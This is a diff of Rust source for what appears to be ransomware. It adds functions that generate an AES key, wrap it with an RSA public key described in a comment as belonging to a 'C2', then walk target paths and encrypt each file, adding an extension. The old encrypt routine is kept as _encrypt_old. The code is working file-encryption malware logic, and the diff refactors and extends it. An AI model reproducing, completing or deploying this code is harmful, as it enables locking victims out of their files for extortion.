@@ -2,17 +2,40 @@ use std::fs::{self, File};
 use std::io::{self, Read, Write};
 use std::path::{Path, PathBuf};
 use rand::Rng;
+use rsa::pkcs8::DecodePublicKey;
 use rsa::{RsaPrivateKey, RsaPublicKey};
-use pkcs1::{DecodeRsaPublicKey};
 use openssl::symm::{self};
 use crate::utils::logger::Logger;
 
+pub fn prepare_encryption_keys(public_key_path: &str) -> Result<([u8; 32], [u8; 16], Vec<u8>), Box<dyn std::error::Error>> {
+    let (aes_key, aes_iv) = generate_aes()?; // Symmetric key
+    let public_key = load_public_key(public_key_path)?;
+    let encrypted_key = encrypt_key(aes_key, &public_key)?; // RSA-encrypted AES key
+    Ok((aes_key, aes_iv, encrypted_key))
+}
+
+pub fn encrypt(targets: Vec<String>, logger: &Logger, extension: &str, aes_key: [u8; 32], aes_iv: [u8; 16]) -> Result<(), Box<dyn std::error::Error>> {
+    let files = get_files(&targets)?;
+
+    // Encrypt files
+    let mut count = 0;
+    for file in &files {
+        logger.log(&format!("Encrypting {}", file.display().to_string()));
+        match encrypt_file(file, aes_key, aes_iv, &extension) {
+            Ok(_) => count+=1,
+            Err(_) => logger.error(&format!("Failed to encrypt: {}", file.display().to_string())),
+        }
+    }
+    logger.log(&format!("Encryption complete: {}/{}", count, files.len()));
+    Ok(())
+}
+
 /// Encrypts files using randomomly generated AES key
-pub fn encrypt(targets: Vec<String>, logger: &Logger, extension: &str, key_path: &str) -> Result<(), Box<dyn std::error::Error>> {
+pub fn _encrypt_old(targets: Vec<String>, logger: &Logger, extension: &str, key_path: &str) -> Result<(), Box<dyn std::error::Error>> {
     let files = get_files(&targets)?;
 
     let (aes_key, aes_iv) = generate_aes()?;
-    let public_key = load_public_key()?;
+    let public_key = load_public_key("c2_rsa_key.pub")?;
     
     // Encrypt files
     let mut count = 0;
@@ -139,13 +162,13 @@ fn encrypt_key(aes_key: [u8; 32], rsa_key: &RsaPublicKey) -> Result<Vec<u8>,Box<
 }
 
 /// Load public key of C2
-fn load_public_key() -> Result<RsaPublicKey, Box<dyn std::error::Error>> {
-    let path = "c2_rsa_key.pub";
+fn load_public_key(path: &str) -> Result<RsaPublicKey, Box<dyn std::error::Error>> {
     let mut reader = fs::File::open(path)?;
     let mut key = String::new();
     reader.read_to_string(&mut key)?;
 
-    let rsa_key = RsaPublicKey::from_pkcs1_pem(&key)?;
+    //let rsa_key = RsaPublicKey::from_pkcs1_pem(&key)?;
+    let rsa_key = RsaPublicKey::from_public_key_pem(&key)?;
 
     Ok(rsa_key)
 }
